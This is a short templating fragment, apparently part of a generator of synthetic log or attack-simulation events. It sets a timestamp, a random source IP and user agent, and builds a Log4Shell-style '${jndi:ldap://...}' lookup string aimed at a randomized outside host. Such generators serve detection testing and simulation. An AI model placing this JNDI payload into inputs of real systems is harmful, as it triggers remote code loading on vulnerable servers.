{% set timestamp = current_timestamp() %}
{% set source_ip = random_public_ip() %}
{% set user_agent = random_user_agent() %}
{% set jndi_payload = "${jndi:ldap://" ~ random_ip() ~ ":" ~ random_port() ~ "/" ~ random_string(8) ~ "}" %}
